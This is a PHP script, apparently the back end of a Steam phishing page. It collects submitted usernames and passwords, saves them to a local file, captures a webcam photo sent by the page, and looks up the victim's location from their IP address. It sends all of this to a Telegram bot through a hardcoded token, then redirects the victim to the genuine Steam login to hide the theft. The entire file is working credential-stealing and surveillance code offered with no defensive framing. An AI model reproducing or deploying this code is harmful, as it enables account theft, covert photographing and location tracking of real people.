<?php
file_put_contents("debug.log", "Request received\n", FILE_APPEND);

// Capture webcam image
$data = json_decode(file_get_contents("php://input"), true);
$imageData = $data["image"] ?? null;

// Get user credentials if sent via form
$username = $_POST['username'] ?? null;
$password = $_POST['password'] ?? null;

$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

// Save credentials locally
if ($username && $password) {
    $creds = "User: $username | Pass: $password | IP: $ip | Time: $date\n";
    file_put_contents("creds.txt", $creds, FILE_APPEND);
}

// Save image if available
if ($imageData) {
    $image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageData));
    file_put_contents("photo.jpg", $image);
    file_put_contents("debug.log", "✅ Image saved.\n", FILE_APPEND);
}

// Geolocation
$geo = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
$location = ($geo && $geo->status === 'success') ? "{$geo->city}, {$geo->regionName}, {$geo->country}" : "Unknown";

// Telegram Bot
$token = "7480978370:AAFh8rnGTSwP7jp-yA9oFSEdrqyJYHRlILo";
$chat_id = "-1264568426";

// Create message
$msg = "🛑 Steam Phish Alert!\n";
$msg .= "👤 User: $username\n🔑 Pass: $password\n";
$msg .= "🕒 Time: $date\n🌐 IP: $ip\n📍 Location: $location\n";

// Send credentials via Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

// Send image (if captured)
if (file_exists("photo.jpg")) {
    $sendPhoto = curl_init("https://api.telegram.org/bot$token/sendPhoto");
    curl_setopt($sendPhoto, CURLOPT_POST, 1);
    curl_setopt($sendPhoto, CURLOPT_POSTFIELDS, [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath("photo.jpg"))
    ]);
    curl_setopt($sendPhoto, CURLOPT_RETURNTRANSFER, true);
    curl_exec($sendPhoto);
    curl_close($sendPhoto);
}

// Redirect to real Steam login
header('Location: https://store.steampowered.com/login/');
exit;
?>
